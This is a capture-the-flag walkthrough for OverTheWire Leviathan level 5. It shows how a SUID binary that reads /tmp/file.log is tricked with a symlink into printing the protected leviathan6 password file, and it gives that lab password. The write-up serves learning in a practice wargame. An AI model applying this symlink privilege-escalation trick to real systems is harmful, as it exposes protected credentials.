# OverTheWire - Leviathan5

* **Platform:** OverTheWire  
* **Game:** Leviathan  
* **Level:** 5 → 6  

---
[&larr; Previous Level](../leviathan4/README.md)
---

### Login

```bash
ssh leviathan5@leviathan.labs.overthewire.org -p 2223
```

### Enumeration

After logging in, I checked the home directory:

```bash
leviathan5@leviathan:~$ ls -lA
-rw-r--r-- 1 root       root         220 Feb 13  2026 .bash_logout
-rw-r--r-- 1 root       root        3851 Jun 24 14:50 .bashrc
-rw-r--r-- 1 root       root         807 Feb 13  2026 .profile
-r-sr-x--- 1 leviathan6 leviathan5 15140 Jun 24 15:00 leviathan5
```
There was a binary `leviathan5` with SUID bit set and owned by leviathan6.

### Analysis

First, I execute leviathan5 SUID:
```bash
leviathan5@leviathan:~$ ./leviathan5 
Cannot find /tmp/file.log
leviathan5@leviathan:~$ echo 'Hello' > /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5 
Hello
```
Here, we watch that `leviathan5` SUID executable print the data present in /tmp/file.log.

### Exploitation
Now, We create a symlink of leviathan6 password file to /tmp/file.log:
```bash
leviathan5@leviathan:~$ ln -fs /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5 
JRGj9iWNOb
```
Here, leviathan5 SUID prints the password for next level.

### Password
`JRGj9iWNOb`

---
[Next Level &rarr;](../leviathan6/README.md) 
---